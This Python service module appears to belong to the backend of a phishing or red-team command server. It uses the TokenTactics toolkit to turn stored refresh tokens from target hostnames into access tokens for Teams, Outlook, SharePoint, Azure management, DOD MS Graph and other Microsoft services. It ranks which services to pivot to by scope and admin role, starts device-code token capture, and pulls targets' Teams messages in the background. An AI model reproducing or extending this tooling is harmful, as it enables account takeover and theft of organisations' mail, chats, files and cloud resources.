"""
PowerShell integration service for the Kodes server.
"""
import logging
import threading
import re
import time
from ..models import DeviceInfo, Log, db
from ..utils.security import encrypt_token, decrypt_token

logger = logging.getLogger(__name__)

TOKEN_SERVICES = {
    'teams':         {'func': 'Invoke-RefreshToMSTeamsToken',              'label': 'Microsoft Teams'},
    'msgraph':       {'func': 'Invoke-RefreshToMSGraphToken',              'label': 'MS Graph'},
    'outlook':       {'func': 'Invoke-RefreshToOutlookToken',              'label': 'Outlook'},
    'sharepoint':    {'func': 'Invoke-RefreshToSharepointOnlineToken',     'label': 'SharePoint Online',
                      'needs_spo': True},
    'azure_mgmt':    {'func': 'Invoke-RefreshToAzureManagementToken',      'label': 'Azure Management'},
    'azure_core':    {'func': 'Invoke-RefreshToAzureCoreManagementToken',  'label': 'Azure Core Management'},
    'aad_graph':     {'func': 'Invoke-RefreshToGraphToken',                'label': 'AAD Graph'},
    'substrate':     {'func': 'Invoke-RefreshToSubstrateToken',            'label': 'Substrate'},
    'yammer':        {'func': 'Invoke-RefreshToYammerToken',               'label': 'Yammer'},
    'office_apps':   {'func': 'Invoke-RefreshToOfficeAppsToken',           'label': 'Office Apps'},
    'office_mgmt':   {'func': 'Invoke-RefreshToOfficeManagementToken',     'label': 'Office Management'},
    'mam':           {'func': 'Invoke-RefreshToMAMToken',                  'label': 'MAM (Intune)'},
    'msmanage':      {'func': 'Invoke-RefreshToMSManageToken',             'label': 'MS Manage'},
    'dod_msgraph':   {'func': 'Invoke-RefreshToDODMSGraphToken',           'label': 'DOD MS Graph'},
}


def _load_service_tokens(device):
    """Returns device.service_tokens JSON as a dict (empty dict if malformed)."""
    import json
    if not device.service_tokens:
        return {}
    try:
        data = json.loads(device.service_tokens)
        return data if isinstance(data, dict) else {}
    except (ValueError, TypeError):
        return {}


def _save_service_token(device, service_key, encrypted_token):
    """Writes a minted service token into the service_tokens JSON."""
    import json
    tokens = _load_service_tokens(device)
    tokens[service_key] = encrypted_token
    device.service_tokens = json.dumps(tokens)


def _strip_ansi(text):
    """Strips ANSI color codes from pwsh error output (readable in the panel)."""
    return re.sub(r'\x1b\[[0-9;]*[A-Za-z]', '', text or '').strip()


class PowerShellService:
    """
    Service for PowerShell-related operations.
    """
    
    @staticmethod
    def generate_service_token(hostname, service_key):
        """
        Mints a token for a specific service from a device's refresh token
        via TokenTactics (every service in TOKEN_SERVICES is supported).

        Args:
            hostname: Device hostname
            service_key: TOKEN_SERVICES key (e.g. 'teams', 'outlook')

        Returns:
            tuple: (bool, str) - (success, message)
        """
        try:
            service = TOKEN_SERVICES.get(service_key)
            if not service:
                return False, f"Unknown service: {service_key}"

            label = service['label']
            ps_func = service['func']

            device = DeviceInfo.query.filter_by(hostname=hostname).first()
            if not device or not device.refresh_token:
                return False, "No refresh token found for this hostname"

            refresh_token = decrypt_token(device.refresh_token)
            if not refresh_token:
                return False, "Error decrypting refresh token"

            import base64
            import subprocess
            from ..utils.powershell import get_powershell_command, TOKEN_TACTICS_PATH
            from ..utils.config import get_target_domain_for

            target_domain = get_target_domain_for(hostname)
            if not target_domain:
                return False, 'Target domain not configured (set "domain" in server.json)'

            # Sink-side validation (defense in depth): the domain is
            # interpolated into a PowerShell command line — only a strict
            # DNS-shaped value may enter, regardless of what the DB holds
            from ..utils.validators import valid_domain
            if not valid_domain(target_domain):
                logger.error(f"Refusing to run PS with invalid target domain for {hostname}")
                return False, "Invalid target domain in campaign/server config"

            token_b64 = base64.b64encode(refresh_token.encode('utf-8')).decode('ascii')
            safe_hostname = re.sub(r'[^\w.-]', '_', hostname or 'unknown')

            ps_call = f"{ps_func} -domain {target_domain}"
            if service.get('needs_spo'):
                spo_domain = target_domain.split('.')[0] + '.sharepoint.com'
                ps_call += f" -spoDomain {spo_domain}"

            command = f"""
            Import-Module "{TOKEN_TACTICS_PATH}";
            Write-Host "Converting to {label} token for {safe_hostname}";
            $refreshToken = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("{token_b64}"));
            $result = {ps_call} -refreshToken $refreshToken;
            if ($result -and $result.access_token) {{
                Write-Host "SERVICE_TOKEN_START";
                Write-Host $result.access_token;
                Write-Host "SERVICE_TOKEN_END";
                Write-Host "Token generated successfully"
                exit 0
            }} else {{
                Write-Host "Error generating token"
                exit 1
            }}
            """

            process = subprocess.Popen(
                [get_powershell_command(), "-Command", command],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                encoding='utf-8',
                errors='replace'
            )

            stdout, stderr = process.communicate()

            if process.returncode != 0:
                err = _strip_ansi(stderr)
                logger.error(f"Error generating {label} token: {err}")
                return False, f"Error generating {label} token: {err}"

            token_match = re.search(r"SERVICE_TOKEN_START\s*(.+?)\s*SERVICE_TOKEN_END", stdout, re.DOTALL)
            if not token_match:
                return False, "Failed to extract token from output"

            token_value = token_match.group(1).strip()
            encrypted_token = encrypt_token(token_value)

            _save_service_token(device, service_key, encrypted_token)
            if service_key == 'teams':
                device.teams_token = encrypted_token
            db.session.commit()

            log_entry = Log(hostname=hostname, log_message=f"{label} token generated for {hostname}")
            db.session.add(log_entry)
            db.session.commit()

            return True, f"{label} token generated successfully"

        except Exception as e:
            logger.error(f"Error generating {service_key} token for {hostname}: {e}")
            return False, f"Error: {str(e)}"

    @staticmethod
    def generate_teams_token(hostname):
        """Backward compatibility: Teams token minting (delegates to generate_service_token)."""
        return PowerShellService.generate_service_token(hostname, 'teams')

    @staticmethod
    def get_service_tokens_map(hostname):
        """
        Returns the {service: bool} map of minted service tokens for a device.
        """
        device = DeviceInfo.query.filter_by(hostname=hostname).first()
        if not device:
            return {}
        tokens = _load_service_tokens(device)
        result = {key: True for key in tokens}
        if device.teams_token:
            result.setdefault('teams', True)
        return result

    @staticmethod
    def recommendations_for_device(hostname):
        """
        Returns recommended TokenTactics actions based on the device's token
        scopes/roles: {service_key: reason_text}
        """
        import json as _json

        device = DeviceInfo.query.filter_by(hostname=hostname).first()
        if not device:
            return {}

        try:
            scopes = _json.loads(device.scopes) if device.scopes else []
        except (ValueError, TypeError):
            scopes = []
        try:
            roles = _json.loads(device.roles) if device.roles else []
        except (ValueError, TypeError):
            roles = []

        scope_blob = ' '.join(str(s) for s in scopes).lower()
        role_blob = ' '.join(str(r) for r in roles).lower()
        has_admin = bool(device.has_admin_permissions) or 'admin' in role_blob

        recs = {}

        if 'mail' in scope_blob or 'imap' in scope_blob or 'smtp' in scope_blob:
            recs['outlook'] = 'Mail access scope present in the token\'u mevcut'
        if 'team' in scope_blob or 'chat' in scope_blob:
            recs['teams'] = 'Teams/chat scope present in the token\'u mevcut'
        if 'site' in scope_blob or 'sharepoint' in scope_blob or 'allsite' in scope_blob:
            recs['sharepoint'] = 'SharePoint/site access scope present in the token\'u mevcut'
        if 'files' in scope_blob or 'onedrive' in scope_blob:
            recs['substrate'] = 'Substrate token for file/OneDrive access'
        if 'user.read' in scope_blob or 'directory' in scope_blob or 'group' in scope_blob:
            recs['msgraph'] = 'MS Graph token for directory/user reads'
        if 'notes' in scope_blob or 'onenote' in scope_blob:
            recs['aad_graph'] = 'AAD Graph for OneNote resources'

        if has_admin:
            recs.setdefault('azure_mgmt', 'Admin privileges detected — Azure resources')
            recs.setdefault('azure_core', 'Admin privileges detected — Azure core management')
            recs.setdefault('office_mgmt', 'Admin privileges detected — Office 365 management')
            recs.setdefault('msmanage', 'Admin privileges detected — MS Manage endpoint')

        if not recs:
            recs['msgraph'] = 'Baseline general Graph access'

        return recs


    @staticmethod
    def get_teams_messages(hostname, force_refresh=False):
        """
        Get Teams messages for a device. This method will check if cached data is available,
        and if not or if force_refresh is True, it will start an asynchronous process to fetch new data.
        
        Args:
            hostname: Device hostname
            force_refresh: Force refresh data even if cache exists
            
        Returns:
            dict: Status information about the request
        """
        from ..models import TeamsMessages
        from ..utils.powershell import get_teams_messages_async
        import threading
        
        try:
            device = DeviceInfo.query.filter_by(hostname=hostname).first()
            if not device or not device.teams_token:
                return {"status": "error", "message": "No Teams token found for this hostname"}
            
            teams_message_record = TeamsMessages.query.filter_by(hostname=hostname).first()
            
            if teams_message_record and teams_message_record.status == 'completed' and not force_refresh:
                return {
                    "status": "completed", 
                    "message": "Data available from cache",
                    "last_updated": teams_message_record.last_updated.isoformat() if teams_message_record.last_updated else None
                }
            
            if teams_message_record and teams_message_record.status in ('processing', 'pending'):
                from datetime import datetime, timedelta
                stale = None
                if teams_message_record.last_updated:
                    try:
                        stale = teams_message_record.last_updated < datetime.now() - timedelta(minutes=5)
                    except Exception:
                        stale = None
                if not stale:
                    return {"status": "processing", "message": "Request is being processed"}
                logger.info(f"Stale Teams fetch record for {hostname} (dead thread), restarting")
                teams_message_record.status = 'pending'
                db.session.commit()
            
            teams_token = decrypt_token(device.teams_token)
            if not teams_token:
                return {"status": "error", "message": "Error decrypting Teams token"}
            
            if not teams_message_record:
                teams_message_record = TeamsMessages(hostname=hostname, status='pending')
                db.session.add(teams_message_record)
            else:
                teams_message_record.status = 'pending'
                
            db.session.commit()
            
            thread = threading.Thread(
                target=get_teams_messages_async,
                args=(teams_token, hostname)
            )
            thread.daemon = True
            thread.start()
            
            log_message = f"{hostname} Teams messages retrieval started"
            log_entry = Log(hostname=hostname, log_message=log_message)
            db.session.add(log_entry)
            db.session.commit()
            
            return {"status": "processing", "message": "Request has been started"}
            
        except Exception as e:
            logger.error(f"Error initiating Teams messages retrieval for {hostname}: {e}")
            return {"status": "error", "message": f"Error: {str(e)}"}
            
    @staticmethod
    def get_teams_messages_status(hostname):
        """
        Get the status of a Teams messages retrieval process.
        
        Args:
            hostname: Device hostname
            
        Returns:
            dict: Status information
        """
        from ..models import TeamsMessages
        
        try:
            record = TeamsMessages.query.filter_by(hostname=hostname).first()
            if not record:
                return {"status": "not_found", "message": "No record found for this hostname"}
                
            return {
                "status": record.status,
                "last_updated": record.last_updated.isoformat() if record.last_updated else None,
                "error": record.error_message
            }
            
        except Exception as e:
            logger.error(f"Error getting Teams messages status for {hostname}: {e}")
            return {"status": "error", "message": f"Error: {str(e)}"}
            
    @staticmethod
    def get_teams_messages_content(hostname, formatted=True):
        """
        Get the content of cached Teams messages.
        
        Args:
            hostname: Device hostname
            formatted: Whether to return formatted content
            
        Returns:
            str: The messages content or error message
        """
        from ..models import TeamsMessages
        
        try:
            record = TeamsMessages.query.filter_by(hostname=hostname).first()
            if not record:
                return "No cached data found for this hostname"
                
            if record.status != 'completed':
                return f"Data is not ready yet. Current status: {record.status}"
                
            if formatted and record.messages_formatted:
                return record.messages_formatted
            else:
                return record.messages_raw or "No data available"
                
        except Exception as e:
            logger.error(f"Error getting Teams messages content for {hostname}: {e}")
            return f"Error: {str(e)}"
    
    @staticmethod
    def start_token_acquisition(hostname):
        """
        Start the token acquisition process for a device.
        
        Args:
            hostname: Device hostname
            
        Returns:
            tuple: (bool, str) - (success, user_code or error message)
        """
        from ..utils.powershell import run_token_acquisition, process_tokens_for_device
        
        try:
            if process_tokens_for_device(hostname, db.session):
                logger.info(f"Tokens found in log file for {hostname} during service check")
                return True, "OK"
            
            event = threading.Event()
            shared_data = {}
            
            thread = threading.Thread(
                target=run_token_acquisition,
                args=(hostname, event, shared_data, db.session)
            )
            thread.daemon = True
            thread.start()
            
            initial_startup = 0.5
            time.sleep(initial_startup)
            
            from ..utils.powershell import sessions_lock, active_sessions
            with sessions_lock:
                if hostname in active_sessions:
                    if isinstance(active_sessions[hostname], dict) and 'user_code' in active_sessions[hostname]:
                        logger.info(f"User code found immediately for {hostname}: {active_sessions[hostname]['user_code']}")
                        return True, active_sessions[hostname]['user_code']
                    elif hasattr(active_sessions[hostname], 'user_code') and active_sessions[hostname].user_code:
                        logger.info(f"User code found immediately for {hostname}: {active_sessions[hostname].user_code}")
                        return True, active_sessions[hostname].user_code
            
            short_timeout = 2
            if not event.wait(timeout=short_timeout):
                with sessions_lock:
                    if hostname in active_sessions:
                        if isinstance(active_sessions[hostname], dict) and 'user_code' in active_sessions[hostname]:
                            logger.info(f"User code found after short wait for {hostname}: {active_sessions[hostname]['user_code']}")
                            return True, active_sessions[hostname]['user_code']
                        elif hasattr(active_sessions[hostname], 'user_code') and active_sessions[hostname].user_code:
                            logger.info(f"User code found after short wait for {hostname}: {active_sessions[hostname].user_code}")
                            return True, active_sessions[hostname].user_code
                
                remaining_timeout = 177
                if not event.wait(timeout=remaining_timeout):
                    if process_tokens_for_device(hostname, db.session):
                        return True, "OK"
                    
                from ..utils.powershell import sessions_lock, active_sessions
                with sessions_lock:
                    if hostname in active_sessions:
                        if isinstance(active_sessions[hostname], dict):
                            if active_sessions[hostname].get('tokens_processed'):
                                logger.info(f"Tokens already processed for {hostname}")
                                return True, "OK"
                            if active_sessions[hostname].get('token_found'):
                                logger.info(f"Token found for {hostname}, waiting for processing")
                                return True, "PROCESSING"
                            if 'user_code' in active_sessions[hostname]:
                                return True, active_sessions[hostname]['user_code']
                                
                        elif hasattr(active_sessions[hostname], 'user_code') and active_sessions[hostname].user_code:
                            return True, active_sessions[hostname].user_code
                
                from ..utils.powershell import check_active_session
                if check_active_session(hostname):
                    with sessions_lock:
                        if hostname in active_sessions:
                            if isinstance(active_sessions[hostname], dict):
                                if 'process' in active_sessions[hostname]:
                                    try:
                                        active_sessions[hostname]['process'].terminate()
                                    except:
                                        pass
                                elif 'session_obj' in active_sessions[hostname]:
                                    try:
                                        active_sessions[hostname]['session_obj'].terminate()
                                    except:
                                        pass
                            elif hasattr(active_sessions[hostname], 'terminate'):
                                try:
                                    active_sessions[hostname].terminate()
                                except:
                                    pass
                            active_sessions.pop(hostname, None)
                
                return False, "Timeout waiting for device code"
            
            if error_msg := shared_data.get('error'):
                return False, error_msg
                
            if shared_data.get('tokens_found'):
                return True, "OK"
            
            user_code = shared_data.get('user_code')
            if not user_code:
                return False, "No device code received"
                
            if user_code == "TOKENS_FOUND":
                return True, "OK"
            
            return True, user_code
            
        except Exception as e:
            logger.error(f"Error starting token acquisition for {hostname}: {e}")
            return False, f"Error: {str(e)}"
